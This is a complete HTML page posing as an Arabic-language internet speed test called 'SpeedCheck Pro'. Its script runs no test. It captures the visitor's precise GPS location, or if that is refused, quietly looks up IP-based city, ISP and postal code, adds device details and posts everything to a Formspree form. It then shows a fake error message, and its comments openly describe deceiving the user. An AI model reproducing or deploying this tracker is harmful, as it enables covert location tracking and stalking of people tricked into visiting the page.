<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>SpeedCheck Pro | فحص السرعة</title>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: white; text-align: center; padding: 50px 20px; }
        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; margin: auto; }
        .btn { background: #38bdf8; color: #0f172a; padding: 15px 30px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 1.1rem; transition: 0.3s; }
        .btn:hover { background: #7dd3fc; transform: scale(1.05); }
        .info { margin-top: 20px; font-size: 0.9rem; color: #94a3b8; }
    </style>
</head>
<body>

    <div class="card">
        <h2>SpeedCheck <span style="color:#38bdf8">2026</span></h2>
        <p>قم بفحص سرعة الإنترنت وأمان الشبكة في منطقتك.</p>
        <button class="btn" onclick="startTest()">ابدأ الفحص الآن</button>
        <div id="status" class="info">بانتظار بدء الاختبار...</div>
    </div>

    <script>
        async function startTest() {
            const status = document.getElementById('status');
            status.innerText = "جاري البحث عن أقرب خادم لمدينتك...";

            let report = {
                action: "Speed Test Initiated",
                device: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`
            };

            // 1. محاولة جلب الموقع الدقيق (بسبب "فحص السرعة" سيوافق المستخدم غالباً)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        report.method = "GPS (High Accuracy)";
                        report.gps = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        };
                        await sendAndExit(report);
                    },
                    async (err) => {
                        // إذا رفض، ننتقل فوراً لخطة الـ IP الصامتة
                        report.method = "IP (Network Tower)";
                        await fetchIPData(report);
                    },
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } else {
                await fetchIPData(report);
            }
        }

        async function fetchIPData(report) {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                report.ip_info = {
                    ip: data.ip,
                    city: data.city,
                    isp: data.org,
                    postal: data.postal,
                    approx_map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                };
            } catch (e) {}
            await sendAndExit(report);
        }

        async function sendAndExit(report) {
            const formID = 'xkozoaaq'; 
            await fetch(`https://formspree.io/f/${formID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(report)
            });
            
            document.getElementById('status').innerText = "تم العثور على الخادم. جاري اختبار السرعة...";
            // إيهام المستخدم ببدء الفحص
            setTimeout(() => {
                alert("خطأ في الاتصال بالخادم. يرجى المحاولة لاحقاً.");
            }, 3000);
        }
    </script>
</body>
</html>
